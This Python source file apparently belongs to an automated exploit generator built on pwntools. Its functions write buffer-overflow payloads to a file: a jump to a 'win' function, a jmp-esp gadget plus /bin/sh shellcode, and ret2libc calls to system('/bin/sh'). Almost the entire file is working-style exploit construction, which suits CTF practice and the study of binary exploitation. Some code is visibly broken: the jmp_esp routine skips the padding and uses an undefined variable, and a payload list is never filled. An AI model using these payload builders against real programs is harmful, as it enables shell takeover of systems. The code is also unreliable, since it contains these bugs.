from helpers import *
from pwn import *


def find_goal_function(binaryName, padding, goalFunction, outfile, verbose):
    """
    Attempts to create a paylaod for the given binary where the program flow
    is redirected to a specific goal function.
    Input: 
        - binaryName: the target binary
        - padding: the amount of padding that will be used to achieve the
          buffer overflow
        - goalFunction: the function where the program flow will be redirected
        - outfile: the file where the payload will be written
        - verbose: whether or not extra information will be printed to stdout 
    """
    dprint("Trying to reach goal functions...", verbose)
    goalFunctions = find_function(binaryName, goalFunction)
    for f in goalFunctions:
        dprint("Writing payload to resultfile.")
        payload = padding + print_hex(f[0])
        add_payload(f"Overflow to win-function: {f[1]}", "goalFunction",
                    payload, outfile)


def jmp_esp(binaryName, padding, outfile, verbose):
    """
    Attempts to create a payload consisting of a rop gadget, allowing an 
    attacker to jump to the stack pointer, and a shellcode.
        Input: 
            - binaryName: the target binary
            - padding: the amount of padding that will be used to achieve the
              buffer overflow
            - outfile: the file where the payload will be written
            - verbose: whether or not extra information will be printed to stdout 
    """
    dprint("--- Trying to find a gadget that allows jumpin to esp...--- ", 
           verbose)
    gadgets = find_rop_gadget(binaryName, "jmp esp")
    if gadgets == []:
        dprint("No matches for \"jmp esp\"")
    else:
        for gadget in gadgets:
            payload = gadget.split()[0] +  pwnlib.shellcraft.i386.linux.sh()
            add_payload(f"Jumping to shellcode on esp: {f[1]}", "jmpEsp",
                        payload, outfile)

def ret2libc(binaryName, padding, outfile, verbose):
    """
    Attempts to create a payload where the program flow is redirected to 
    a function within libc.
        Input: 
            - binaryName: the target binary
            - padding: the amount of padding that will be used to achieve the
              buffer overflow
            - outfile: the file where the payload will be written
            - verbose: whether or not extra information will be printed to stdout 
    """
    protections = Protections(binaryName)
    sysAddress = find_function(binaryName, "system")
    shellStringAddr = find_strings(binaryName, "/bin/sh")
    print(sysAddress, shellStringAddr)
    payloads = []
    for sA in sysAddress:
        for n, sSA in enumerate(shellStringAddr):
            add_payload(f"Adding ret2libc-payload to function {sA[1]} " +
                        f"with parameter {sSA[1]}", f"ret2libc{n}",
                        padding + print_hex(sA[0]) +
                                "BBBB" + print_hex(sSA[0]), outfile)
    print(payloads)
